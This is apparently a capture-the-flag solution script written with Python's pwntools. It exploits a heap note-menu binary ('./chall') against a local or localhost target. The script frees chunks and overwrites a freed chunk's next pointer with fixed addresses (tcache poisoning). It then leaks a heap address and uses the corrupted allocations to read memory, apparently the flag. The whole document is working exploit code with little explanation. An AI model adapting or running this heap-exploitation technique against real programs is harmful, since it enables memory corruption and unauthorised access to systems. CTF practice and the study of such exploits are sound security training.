#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = './chall'

if args.REMOTE:
    p = remote('localhost', 9999)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)


def new(message):
    p.sendlineafter(b'ag\n\n', b'1')
    p.sendlineafter(b'?\n\n', message)

def change(index, message):
    p.sendlineafter(b'ag\n\n', b'2')
    p.sendlineafter(b'?\n\n', str(index).encode())
    p.sendlineafter(b'?\n\n', message)

def view(index):
    p.sendlineafter(b'ag\n\n', b'3')
    p.sendlineafter(b'?\n\n', str(index).encode())


def remove(index):
    p.sendlineafter(b'ag\n\n', b'4')
    p.sendlineafter(b'?\n\n', str(index).encode())


def flag():
    p.sendlineafter(b'ag\n\n', b'5')



flag()
new(b'i hate docker')
new(b'docker is hell on earth')
remove(0)
remove(1)


p.sendlineafter(b'ag\n\n', b'2')
p.sendlineafter(b'?\n\n', b'1')
p.sendafter(b'?\n\n', p64(0x4040d0))

# gdb.attach(p)

new(b'oiasjdfoiasjdfoijasdoifjasoidjfaoisjdf')
p.sendlineafter(b'ag\n\n', b'1')
payload = b'SCONES' + (b'S' * 10)
p.sendafter(b'?\n\n', payload)

view(3)


p.recvuntil(b'SCONES' + (b'S' * 10))

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
leak = leak - 0x1010
print(hex(leak))

remove(0)
remove(1)


p.sendlineafter(b'ag\n\n', b'2')
p.sendlineafter(b'?\n\n', b'1')
p.sendafter(b'?\n\n', p64(0x4040e0))


new(b'AHHHHHHHHHHHHHHHHHHHHH')
p.sendlineafter(b'ag\n\n', b'1')
p.sendafter(b'?\n\n', p64(leak))



change(5, p64(leak))
view(0)



p.interactive()

